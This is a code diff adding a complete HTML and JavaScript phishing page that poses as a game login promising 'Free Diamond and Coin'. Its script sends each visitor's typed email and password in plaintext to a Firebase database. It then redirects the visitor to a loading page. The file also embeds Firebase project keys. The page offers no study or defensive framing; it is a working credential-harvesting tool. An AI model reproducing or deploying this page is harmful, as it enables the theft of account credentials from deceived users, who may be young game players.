@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Login</title>
+  <style>
+    body{
+      background: url("background login.jpg");
+      background-size: 430px;
+      background-repeat: no-repeat;
+      display: flex;
+      align-items: center;
+      justify-items: center;
+    }
+    
+    
+    #items{
+      margin-top: -5px;
+    }
+    
+    #item_title{
+      font-size: 18px;
+      margin-top: 100px;
+      margin-left: 180px;
+      font-family: fantasy, monospace;
+      
+    }
+    
+    #item_info{
+      font-size: 8px;
+      margin-left: 125px;
+      margin-top: -5px;
+    }
+    
+    
+    #email_ti{
+      color: grey;
+      font-size: 8px;
+      margin-left: 120px;
+      position: absolute;
+      margin-top: 1px;
+    }
+    
+    
+    #email{
+      margin-top: 10px;
+      margin-left: 120px;
+      background: transparent;
+      border: 1px solid grey;
+      font-family: fantasy, monospace;
+      width: 180px;
+      height: 15px;
+      font-size: 8px;
+    }
+    
+    #password_ti{
+      color: grey;
+      font-size: 8px;
+      margin-left: 120px;
+      position: absolute;
+      margin-top: 6px;
+    }
+    
+    #password{
+      margin-left: 120px;
+      margin-top: 15px;
+      background: transparent;
+      border: 1px solid grey;
+      font-family: fantasy, monospace;
+      width: 180px;
+      height: 15px;
+      font-size: 8px;
+      
+      
+    }
+    
+    
+    
+    
+    
+    #btn{
+      margin-top: 0px;
+      position: absolute;
+      margin-left: 0px;
+    }
+    
+    
+    
+    #visiable{
+      position: absolute;
+      margin-left: -185px;
+      height: 10px;
+      margin-top: 38px;
+    }
+    
+    
+    
+    
+    
+    #show{
+      font-size: 8px;
+      margin-left: 135px;
+      font-family: fantasy, monospace;
+      margin-top: 6px;
+    }
+    
+    
+    
+    #btn{
+      color: white;
+      background: green;
+      border: 2px solid sandybrown;
+      height: 20px;
+      font-size: 12px;
+      border-radius: 5px;
+      padding-left: 20px;
+      padding-right: 20px;
+      margin-left: 175px;
+    }
+    
+    
+    
+    #btn:active{
+      opacity: 0.5;
+    }
+    
+    input{
+      outline: none;
+    }
+    
+    
+    
+    #wrong_password{
+      position: absolute; font-size: 8px; color: red; margin-left: 0px; margin-top: 0px; font-family: fantasy, monospace; display: none;
+    }
+    
+    
+    
+    
+   #loading{
+     position: absolute;
+   }
+        
+      
+    
+    
+    
+    @media only screen and (min-width: 980px){
+      
+      body{
+       background-size: 1000px;
+      }
+      
+       #item_title{
+         font-size: 50px;
+         margin-top: 280px;
+         margin-left: 430px;
+        font-family: fantasy, monospace;
+       }
+       
+       #email{
+      margin-top: 15px;
+      margin-left: 350px;
+      position: absolute;
+      background: transparent;
+      border: 1px solid grey;
+      font-family: fantasy, monospace;
+      width: 330px;
+      height: 25px;
+      font-size: 15px;
+      transform: scale(1.2);
+       }
+       
+       #password{
+      margin-left: 350px;
+      margin-top: 90px;
+      background: transparent;
+      position: absolute;
+      border: 1px solid grey;
+      font-family: fantasy, monospace;
+      width: 330px;
+      height: 25px;
+      font-size: 15px;
+      transform: scale(1.2)
+       }
+       
+       #items{
+         transform: scale(1);
+         margin-top: -30px;
+       }
+       
+       #item_info{
+         font-size: 15px;
+         margin-left: 335px;
+         margin-top: -30px;
+       }
+       
+       #visiable{
+      position: absolute;
+      margin-left: 320px;
+      height: 80px;
+      margin-top: 95px;
+       }
+       
+       
+       #email_ti{
+         color: grey;
+         font-size: 18px;
+         margin-left: 320px;
+         font-family: fantasy, monospace;
+         margin-top: -10px;
+         position: absolute;
+       }
+       
+       
+       #password_ti{
+         color: grey;
+         font-size: 18px;
+         margin-left: 320px;
+         font-family: fantasy, monospace;
+         margin-top: 68px;
+         position: absolute;
+       }
+       
+       
+       
+       #show{
+         color: grey;
+         font-size: 15px;
+         margin-left: 338px;
+         font-family: fantasy, monospace;
+         margin-top: 128px;
+         position: absolute;
+       }
+       
+       
+       
+       #btn{
+      color: white;
+      background: green;
+      border: 4px solid sandybrown;
+      height: 40px;
+      font-size: 10px;
+      border-radius: 10px;
+      padding-left: 50px;
+      padding-right: 50px;
+      margin-left: 420px;
+      margin-top: 180px;
+      font-size: 25px;
+      object-fit: cover;
+       }
+       
+       
+       
+       
+    }
+    
+    
+    
+    
+    
+    
+    
+  </style>
+</head>
+
+<body id="body">
+<div id="items">
+  <h2 id="item_title">Log in</h2>
+  <h3 id="item_info">Enter <span style="color: blue;">Your</span> Account to Get Free Diamond and Coin</h3>
+  
+<p id="email_ti">E-mail</p>
+  
+    <span style="position: absolute; margin-left: 225px; font-size: 9px; color: red; font-family: fantasy, monospace; display: none" id="wrong_email">Incorrect Email</span>
+  
+  
+  
+  <input type="email" name="" id="email" required>
+  <p id="password_ti">Password</p>
+  
+    <p id="wrong_password">0-30 alphabet password</p>
+  
+  
+  <input type="password" name="" id="password" required>
+  <input type="checkbox" name="" id="visiable">
+  <p id="show">Show Password</p>
+  <input type="submit" value="Login" id="btn">
+</div>
+
+<div id="loading">
+  <div id="inner">
+    
+  </div>
+</div>
+
+<script>
+  
+  
+  
+  let height = window.getComputedStyle(body)
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</script>
+
+
+
+
+
+<script type="module">
+  
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
+  // TODO: Add SDKs 
+  const firebaseConfig = {
+    apiKey: "AIzaSyBg3RLSYY0SqHCwuPQ4IwPo3skkRYQLgyg",
+    authDomain: "herowar-41f8d.firebaseapp.com",
+    databaseURL: "https://herowar-41f8d-default-rtdb.firebaseio.com",
+    projectId: "herowar-41f8d",
+    storageBucket: "herowar-41f8d.appspot.com",
+    messagingSenderId: "535960391140",
+    appId: "1:535960391140:web:458ab1b34a591c4c500bf1"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  
+  
+  
+  import {getDatabase, ref, child, get, set, update, remove} from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";
+  
+  const db = getDatabase();
+  
+  
+  
+  
+  let email = document.getElementById("email");
+  let password= document.getElementById("password");
+  let visiable = document.getElementById("visiable");
+  let wrong_email = document.getElementById("wrong_email");
+  let wrong_password = document.getElementById("wrong_password");
+  let btn = document.getElementById("btn");
+  let body = document.body;
+  let login;
+  let random;
+  let items = document.getElementById("items");
+  
+  email.onclick = function(){
+    chk_email();
+  }
+  
+  
+  
+  let login2;
+  
+  
+  function chk_email(){
+  setInterval(function(){
+    if(!email.value.match(/^[A-Za-z\._\-0-9]*[@][A-Za-z]*[\.][a-z]{2,4}$/)){
+      email.style.border = "1px solid red";
+      login2 = false;
+     
+    } else{
+      email.style.border = "1px grey solid";
+      login2 = true;
+    }
+  })
+  
+  }
+  
+  
+  visiable.onchange = function(){
+    if(visiable.checked == true){
+      password.type = "text";
+    } else if(visiable.checked == false){
+      password.type = "password";
+    }
+      
+  }
+  
+  
+  
+  btn.onclick = function(){
+    
+    if(login2){
+    
+    if(email.value == ""){
+      login = false;
+      email.style.border = "1px red solid";
+    } else if(email.value !== ""){
+    
+      email.style.border = "1px grey solid";
+      login = true;
+    }
+    
+    
+    
+    if(password.value == ""){
+      password.style.border = "1px red solid";
+      login = false;
+    } else if(password.value !== ""){
+      
+      password.style.border = "1px grey solid";
+      login = true;
+    }
+    
+    if(login){
+       random = Math.floor(Math.random(100000) * 10000);
+      Adddata();
+      items.style.opacity = "0.1"
+      
+    } else if(!login){
+      email.style.border = "1px red solid";
+      
+    }
+    
+    
+    
+  }
+  
+  
+  }
+  
+  
+  function Adddata(){
+    set(ref(db, "user/"+random, + email.value), {
+      Email: {Email: email.value},
+      Password: {Password: password.value}
+    }).then(()=>{
+      btn.onsubmit();
+      
+    })
+  }
+  
+  
+  
+  
+  
+  
+  
+  btn.onsubmit = function(){
+   window.location.href = "loading.html";
+   localStorage.setItem("email", email.value);
+   
+  }
+  
+  
+  
+  
+  
+  
+  
+  
+</script>
+
+
+
+
+</body>
+
+</html>
